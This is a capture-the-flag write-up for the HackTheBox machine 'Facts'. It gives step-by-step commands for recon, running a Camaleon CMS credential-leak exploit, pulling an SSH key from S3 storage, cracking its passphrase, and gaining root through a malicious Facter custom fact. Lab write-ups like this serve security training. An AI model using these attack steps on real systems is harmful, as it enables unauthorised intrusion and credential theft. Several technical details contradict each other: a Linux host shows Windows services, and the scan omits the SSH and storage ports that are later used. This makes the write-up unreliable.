<img width="446" height="259" alt="image" src="https://github.com/user-attachments/assets/e1d279e0-784b-4b7c-9699-32345c182a4e" />


# HackTheBox: Facts Writeup

**Target IP:** `10.10.11.x` (replace with actual IP)  
**OS:** Linux (Lab Environment)

---

## 1. Reconnaissance & Scanning

Map the target's attack surface.

- Ensure hostname resolves correctly by adding to `/etc/hosts`:
  ```bash
  echo "10.10.11.x facts.htb" | sudo tee -a /etc/hosts
  ```

- Network Scanning: Identify running services with Nmap:
  ```bash
  nmap -sC -sV -oA nmap/facts 10.10.11.x
  ```

  **Results:**
  - Port 80 (HTTP): Web server hosting the trivia site.
  - Port 1433 (MSSQL): Microsoft SQL Server.
  - Port 5985 (WinRM): Suggests a Windows environment or cross-platform interaction.

---

## 2. Enumeration

### Web & Subdomain Discovery

- Visit: [http://facts.htb](http://facts.htb)
- Discover administrative entry points using Gobuster:
  ```bash
  gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
  ```
- The `/admin` directory is found. Accessing its login page allows registration of a dummy account:

  - **Username:** `johnr`
  - **Password:** `johnr123`

### CMS Identification

- Logged into dashboard, meta tags identify:  
  **Camaleon CMS v2.9.0** (known vulnerabilities)

---

## 3. Exploitation

### CVE-2025–2304 (Privilege Escalation & Leak)

- Camaleon CMS v2.9.0 is vulnerable to a post-auth credential leak.
- With user `johnr`, exploit to leak AWS S3 config.

**Exploit Example:**
```bash
python3 exploit_camaleon.py http://facts.htb -u johnr -p johnr123
```

**Exposure:**
- AWS S3 bucket credentials are leaked. Use AWS CLI:
  ```bash
  export AWS_ACCESS_KEY_ID=AKIA...
  export AWS_SECRET_ACCESS_KEY=...
  aws s3 ls s3://facts-storage-bucket --endpoint-url http://facts.htb:4566
  ```

- Find and download `id_rsa` file:
  ```bash
  aws s3 cp s3://facts-storage-bucket/id_rsa . --endpoint-url http://facts.htb:4566
  ```

---

## 4. Privilege Escalation (User)

### SSH Key Cracking

- The SSH key (`id_rsa`) is passphrase-protected.
- Use `John the Ripper` or `Hashcat`:

  **Extract the hash:**
  ```bash
  ssh2john id_rsa > id_rsa.hash
  ```

  **Crack with Hashcat:**
  ```bash
  hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
  ```

  - Password is recovered: `dragonballz`

**SSH Access:**
```bash
chmod 600 id_rsa
ssh -i id_rsa william@facts.htb
```
**User Flag:**  
```
[REDACTED_USER_FLAG]
```

---

## 5. Privilege Escalation (Root)

### Facter Library Hijacking

- Find `/usr/bin/facter` (Ruby-based system info tool)

- Facter searches for custom facts in certain directories. Create a malicious Ruby fact:

  **/tmp/exploit.rb**
  ```ruby
  Facter.add(:evil_fact) do
    setcode do
      File.read("/root/root.txt") # Or execute a shell: /bin/bash -p
    end
  end
  ```

**Execute:**
```bash
facter --custom-dir /tmp evil_fact
```
_If Facter is run with elevated privileges (e.g., via sudo or a cronjob):_
```bash
export FACTERLIB=/tmp
sudo /usr/bin/facter
```

**Root Flag:**  
```
[REDACTED_ROOT_FLAG]
```

---

## Summary

- Initial access gained through web enumeration, exploiting a vulnerable CMS.
- Credentials allowed S3 access and retrieval of an SSH key.
- SSH key cracking yielded a user shell.
- SUID binary (`facter`) abuse results in root privilege escalation.

---

**Note:** All flags in this writeup have been redacted for privacy and integrity.
